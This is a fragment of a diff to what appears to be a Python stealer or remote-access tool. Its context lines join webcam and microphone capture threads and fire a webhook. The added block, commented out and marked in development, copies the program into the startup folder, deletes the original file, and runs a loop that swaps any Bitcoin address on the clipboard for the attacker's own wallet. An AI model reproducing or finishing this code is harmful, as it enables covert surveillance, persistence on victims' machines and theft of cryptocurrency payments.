@@ -667,3 +667,18 @@ webcamthread.join()
 micthread.join()
 
 webhook.execute()
+
+#INDEV (BTC WALLET ADDRESS REPLACER AND COPY TO STARTUP):
+#if not os.path.realpath(sys.executable) == startup_script_path:
+#    copy_to_startup()
+#    webhook.execute()
+#    os.remove(os.path.realpath(sys.executable))
+#elif os.path.realpath(sys.executable) == startup_script_path:
+#    while True:
+#     try:
+#         clipboarddata = pyperclip.paste()
+#         ourbtc = re.search(r'^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,}$', clipboarddata)
+#         if ourbtc:
+#            pyperclip.copy(f"{btc_wallet}")
+#     except pyperclip.PyperclipException:
+#        pass   
